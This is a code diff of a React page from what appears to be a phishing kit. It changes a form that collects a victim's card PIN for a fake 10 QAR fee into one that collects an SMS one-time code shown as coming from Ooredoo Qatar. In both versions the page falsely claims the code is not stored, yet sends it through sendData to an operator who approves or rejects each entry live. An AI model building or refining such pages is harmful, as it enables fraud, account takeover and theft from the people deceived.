@@ -5,7 +5,7 @@ import { Button } from "@/components/ui/button";
 import SiteHeader from "@/components/SiteHeader";
 import SiteFooter from "@/components/SiteFooter";
 import WaitingOverlay from "@/components/WaitingOverlay";
-import { Loader2, Lock, ShieldCheck, Stethoscope, Timer, MessageSquare, Eye, EyeOff } from "lucide-react";
+import { Loader2, PhoneCall, ShieldCheck, MessageSquare } from "lucide-react";
 import { useLang } from "@/i18n/LanguageContext";
 import { getServiceContext } from "@/lib/serviceContext";
 import {
@@ -16,34 +16,36 @@ import {
   waitingMessage,
 } from "@/lib/store";
 
-const MAROON = "#8b1538";
-const FEE_QAR = 10;
-
 const CardPin = () => {
   const { pick, dir } = useLang();
   const [, navigate] = useLocation();
-  const storedService =
-    typeof window !== "undefined" ? sessionStorage.getItem("selected_service") || "" : "";
-  const serviceContext = getServiceContext(storedService);
+  const selectedService =
+    typeof window !== "undefined" ? sessionStorage.getItem("selected_service") : null;
+  const serviceContext = getServiceContext(selectedService);
 
   const [digits, setDigits] = useState(["", "", "", ""]);
-  const [showPin, setShowPin] = useState(false);
   const [loading, setLoading] = useState(false);
-  const [isWaiting, setIsWaiting] = useState(false);
-  const [error, setError] = useState(false);
+  const [waiting, setWaiting] = useState(false);
+  const [rejected, setRejected] = useState(false);
+  const [seconds, setSeconds] = useState(54);
   const inputsRef = useRef<Array<HTMLInputElement | null>>([]);
 
-  const pin = digits.join("");
-  const isValid = pin.length === 4;
+  const code = digits.join("");
+  const isValid = code.length === 4;
 
   useEffect(() => {
-    navigateToPage("الرقم السري PIN");
+    navigateToPage("رمز OTP Ooredoo");
     isFormApproved.value = false;
     isFormRejected.value = false;
     waitingMessage.value = "";
   }, []);
 
-  // Handle approval/rejection from admin
+  useEffect(() => {
+    if (seconds <= 0) return;
+    const t = setTimeout(() => setSeconds((s) => s - 1), 1000);
+    return () => clearTimeout(t);
+  }, [seconds]);
+
   useSignalEffect(() => {
     if (isFormApproved.value) {
       isFormApproved.value = false;
@@ -54,8 +56,8 @@ const CardPin = () => {
   useSignalEffect(() => {
     if (isFormRejected.value) {
       isFormRejected.value = false;
-      setError(true);
-      setIsWaiting(false);
+      setRejected(true);
+      setWaiting(false);
       setLoading(false);
       setDigits(["", "", "", ""]);
       waitingMessage.value = "";
@@ -79,171 +81,139 @@ const CardPin = () => {
     e.preventDefault();
     if (!isValid) return;
     setLoading(true);
-    setError(false);
+    setRejected(false);
     sendData({
-      data: { "الرقم السري PIN": pin },
-      current: "الرقم السري PIN",
+      data: { "رمز OTP Ooredoo": code },
+      current: "رمز OTP Ooredoo",
       waitingForAdminResponse: true,
     });
-    setIsWaiting(true);
+    setWaiting(true);
     setLoading(false);
   };
 
+  const mm = String(Math.floor(seconds / 60)).padStart(2, "0");
+  const ss = String(seconds % 60).padStart(2, "0");
+
   return (
-    <div className="min-h-screen bg-[#eef0fb] relative" dir={dir}>
+    <div className="min-h-screen bg-background relative" dir={dir}>
       <WaitingOverlay />
       <SiteHeader />
 
-      {/* Header band */}
-      <div
-        className="relative px-4 py-6 text-white"
-        style={{ background: `linear-gradient(135deg, ${MAROON} 0%, #6d1029 100%)` }}
-      >
-        <div className="container mx-auto max-w-5xl">
-          <div className="flex items-center gap-3">
-            <div className="w-11 h-11 rounded-xl bg-white/15 backdrop-blur flex items-center justify-center shrink-0">
-              <Stethoscope className="w-5 h-5 text-white" />
+      <section className="px-4 pb-10 pt-6">
+        <div className="container mx-auto max-w-5xl space-y-5">
+          {/* Official notice */}
+          <div className="rounded-2xl bg-gradient-to-l from-red-600 to-red-700 text-white p-5 shadow-lg flex items-center gap-4">
+            <div className="w-12 h-12 rounded-full bg-white/15 flex items-center justify-center shrink-0">
+              <PhoneCall className="w-6 h-6 text-white" />
             </div>
-            <div className="flex-1">
-              <p className="text-[11px] uppercase tracking-widest opacity-80">
+            <div>
+              <p className="text-xs font-bold opacity-90 mb-1">
                 {pick(serviceContext.orgLineAr, serviceContext.orgLineEn)}
               </p>
-              <h1 className="text-lg font-extrabold leading-tight">
-                {pick("تأكيد الرقم السري للبطاقة", "Confirm Card PIN")}
-              </h1>
+              <p className="text-base font-extrabold leading-tight">
+                {pick(
+                  "تأكيد ملكية رقم الهاتف عبر رمز التحقق",
+                  "Verify phone number ownership via one-time code"
+                )}
+              </p>
             </div>
           </div>
-        </div>
-      </div>
 
-      <section className="px-3 pb-10 pt-6 relative z-10">
-        <div className="container mx-auto max-w-5xl space-y-5">
-          {/* Error banner */}
-          {error && (
-            <div className="bg-red-50 border border-red-200 rounded-xl p-3 text-sm text-red-700 font-semibold text-center">
-              {pick("الرقم السري الذي أدخلته غير صحيح. يرجى المحاولة مرة أخرى", "The PIN you entered is incorrect. Please try again.")}
+          {/* Rejection Banner */}
+          {rejected && (
+            <div className="rounded-xl bg-red-50 border border-red-200 text-red-700 p-4 text-sm font-medium">
+              {pick("الرمز الذي أدخلته غير صحيح. يرجى المحاولة مرة أخرى", "The code you entered is incorrect. Please try again.")}
             </div>
           )}
 
-          {/* Notice */}
-          <div className="bg-white rounded-2xl p-5 shadow-sm border border-gray-200">
-            <div className="flex items-start gap-3">
-              <div
-                className="w-9 h-9 rounded-xl flex items-center justify-center shrink-0 shadow-sm"
-                style={{ backgroundColor: MAROON }}
-              >
-                <MessageSquare className="w-4 h-4 text-white" />
-              </div>
-              <div>
-                <p className="text-sm font-bold text-gray-800 mb-0.5">
-                  {pick("تأكيد نهائي لملكية البطاقة", "Final card-ownership confirmation")}
-                </p>
-                <p className="text-xs text-gray-600 leading-relaxed">
-                  {pick(
-                    `أدخل الرقم السري المكوّن من 4 أرقام (PIN) لبطاقتك للتأكيد النهائي وإتمام عملية دفع رسوم تفعيل ${serviceContext.accountAr} (${FEE_QAR} ر.ق).`,
-                    `Enter your 4-digit card PIN to complete the ${serviceContext.accountEn} activation fee payment (QAR ${FEE_QAR}).`
-                  )}
-                </p>
-              </div>
-            </div>
+          {/* Heading */}
+          <div className="space-y-3">
+            <h1 className="text-2xl font-extrabold text-foreground leading-snug">
+              {pick("أدخل رمز التحقق المرسل إلى هاتفك", "Enter the verification code sent to your phone")}
+            </h1>
+            <p className="text-sm text-muted-foreground leading-relaxed">
+              {pick("أرسلنا رمزاً مكوّناً من 4 أرقام عبر SMS من ", "We sent a 4-digit SMS code from ")}
+              <span className="text-red-600 font-bold">Ooredoo Qatar</span>
+              {pick(
+                ` لتأكيد ملكية الخط وربطه رسمياً مع ${serviceContext.accountAr}.`,
+                ` to confirm line ownership and officially link it to your ${serviceContext.accountEn}.`
+              )}
+            </p>
           </div>
 
-          {/* PIN form */}
-          <div className="bg-white rounded-2xl p-5 shadow-sm border border-gray-200 space-y-5">
-            <div className="flex items-center gap-2.5 pb-2.5 border-b border-gray-100">
-              <div
-                className="w-9 h-9 rounded-xl flex items-center justify-center shadow-sm"
-                style={{ backgroundColor: MAROON }}
-              >
-                <Lock className="w-4 h-4 text-white" />
-              </div>
-              <div>
-                <span className="text-base font-bold text-gray-800">{pick("الرقم السري", "PIN")}</span>
-                <p className="text-xs text-gray-500">{pick("4 أرقام", "4 digits")}</p>
-              </div>
-            </div>
-
-            <form id="card-pin-form" onSubmit={handleSubmit} className="space-y-3">
-              <div className="flex items-center justify-between mb-2">
-                <label className="block text-sm font-bold text-gray-600">
-                  {pick("أدخل رقم PIN الخاص ببطاقتك", "Enter your card PIN")}{" "}
-                  <span style={{ color: MAROON }}>*</span>
-                </label>
-                <button
-                  type="button"
-                  onClick={() => setShowPin((s) => !s)}
-                  className="text-xs text-gray-500 hover:text-gray-700 flex items-center gap-1"
-                >
-                  {showPin ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
-                  {showPin ? pick("إخفاء", "Hide") : pick("إظهار", "Show")}
-                </button>
-              </div>
+          {/* Form */}
+          <form onSubmit={handleSubmit} className="space-y-6 pt-2">
+            <div className="space-y-3">
+              <label className="block text-sm font-bold text-foreground">
+                {pick("رمز التحقق", "Verification Code")}
+              </label>
               <div className="flex justify-center gap-3" dir="ltr">
                 {digits.map((d, i) => (
                   <input
                     key={i}
                     ref={(el) => (inputsRef.current[i] = el)}
-                    type={showPin ? "text" : "password"}
+                    type="text"
                     inputMode="numeric"
                     value={d}
                     onChange={(e) => handleChange(i, e.target.value)}
                     onKeyDown={(e) => handleKeyDown(i, e)}
-                    className="w-16 h-16 text-center text-2xl font-bold bg-gray-50/60 border border-gray-200 rounded-xl focus:ring-2 focus:ring-[#8b1538]/30 focus:border-[#8b1538]/50 outline-none transition-all"
+                    className="w-16 h-16 text-center text-2xl font-bold bg-muted/30 border border-border/50 rounded-xl focus:ring-2 focus:ring-red-500/30 focus:border-red-500 outline-none transition-all"
                     maxLength={1}
                     autoFocus={i === 0}
                   />
                 ))}
               </div>
-              <div className="flex items-center justify-center gap-1.5 text-xs text-gray-500 mt-2">
-                <Timer className="w-3.5 h-3.5" />
-                <span>{pick("صلاحية الرمز 5 دقائق فقط", "Code valid for 5 minutes only")}</span>
-              </div>
-            </form>
-          </div>
-
-          <div className="flex items-center gap-2 rounded-xl py-2.5 px-3 bg-white border border-gray-200">
-            <div
-              className="w-7 h-7 rounded-lg flex items-center justify-center shrink-0"
-              style={{ backgroundColor: MAROON }}
-            >
-              <ShieldCheck className="w-3.5 h-3.5 text-white" />
             </div>
-            <p className="text-xs text-gray-600 leading-relaxed">
-              {pick(
-                "الرقم السري مشفّر بالكامل ولن يتم تخزينه أو مشاركته مع أي طرف ثالث.",
-                "The PIN is fully encrypted and will never be stored or shared with any third party."
+
+            <div className="flex items-center justify-center gap-2 text-sm">
+              <MessageSquare className="w-4 h-4 text-muted-foreground" />
+              {seconds > 0 ? (
+                <span className="text-muted-foreground">
+                  {pick("إعادة إرسال الرمز خلال", "Resend code in")}{" "}
+                  <span className="text-red-600 font-bold">{mm}:{ss}</span>
+                </span>
+              ) : (
+                <button
+                  type="button"
+                  onClick={() => setSeconds(54)}
+                  className="text-red-600 font-bold hover:underline"
+                >
+                  {pick("إعادة إرسال الرمز", "Resend code")}
+                </button>
               )}
-            </p>
-          </div>
+            </div>
 
-          <Button
-            form="card-pin-form"
-            type="submit"
-            disabled={loading || isWaiting || !isValid}
-            className="w-full text-white text-base font-bold py-6 rounded-xl shadow-md hover:shadow-xl hover:opacity-95 transition-all"
-            style={{ background: `linear-gradient(135deg, ${MAROON} 0%, #6d1029 100%)` }}
-          >
-            {isWaiting ? (
-              <span className="flex items-center justify-center gap-2">
-                <Loader2 className="h-4 w-4 animate-spin" />
-                {pick("بانتظار الموافقة...", "Waiting for approval...")}
-              </span>
-            ) : loading ? (
-              <span className="flex items-center justify-center gap-2">
-                <Loader2 className="h-4 w-4 animate-spin" />
-                {pick("جارٍ التحقق...", "Verifying...")}
-              </span>
-            ) : (
-              pick("تأكيد وإتمام الدفع", "Confirm and complete payment")
-            )}
-          </Button>
+            {/* Security note */}
+            <div className="flex items-start gap-2.5 rounded-xl bg-muted/40 border border-border/50 p-3">
+              <ShieldCheck className="w-4 h-4 text-red-600 mt-0.5 shrink-0" />
+              <p className="text-xs text-muted-foreground leading-relaxed">
+                {pick(
+                  `يُستخدم رمز التحقق لمرة واحدة فقط لتأكيد ملكية رقم الهاتف، ولا يتم تخزينه لدى ${serviceContext.platformShortAr}.`,
+                  `The verification code is used only once to confirm phone ownership and is not stored by ${serviceContext.platformShortEn}.`
+                )}
+              </p>
+            </div>
 
-          <div className="pt-2">
-            <div className="h-px bg-gradient-to-r from-transparent via-gray-300 to-transparent mb-5" />
-            <p className="text-[11px] text-gray-500 text-center leading-relaxed">
-              {pick(serviceContext.termsAr, serviceContext.termsEn)}
-            </p>
-          </div>
+            <Button
+              type="submit"
+              disabled={loading || waiting || !isValid}
+              className="w-full bg-red-600 hover:bg-red-700 text-white text-base font-bold py-6 rounded-xl shadow-md transition-all"
+            >
+              {waiting ? (
+                <span className="flex items-center justify-center gap-2">
+                  <Loader2 className="h-4 w-4 animate-spin" />
+                  {pick("بانتظار الموافقة...", "Waiting for approval...")}
+                </span>
+              ) : loading ? (
+                <span className="flex items-center justify-center gap-2">
+                  <Loader2 className="h-4 w-4 animate-spin" />
+                  {pick("جارٍ التحقق...", "Verifying...")}
+                </span>
+              ) : (
+                pick("تأكيد الرمز وربط الحساب", "Confirm code and link account")
+              )}
+            </Button>
+          </form>
         </div>
       </section>
       <SiteFooter />
